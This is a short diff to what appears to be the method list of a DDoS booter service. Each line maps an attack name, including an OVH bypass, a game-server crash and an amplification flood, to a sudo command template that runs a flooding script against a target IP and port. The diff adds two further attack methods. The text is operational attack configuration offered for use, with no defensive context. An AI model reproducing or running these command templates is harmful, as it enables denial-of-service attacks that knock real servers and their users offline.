@@ -45,3 +45,7 @@ OVH-RAPE : sudo perl OVHBYPASS.pl %ip% %port% 9999
 GAME : sudo ./GAME-CRASH %ip% %port%
 
 AMP : sudo perl amp.pl %ip% %port% 5500 9999
+
+Twiks : sudo ./Twiks %ip% %port%
+
+35 : sudo perl 35.pl %ip% %port% 1000 300
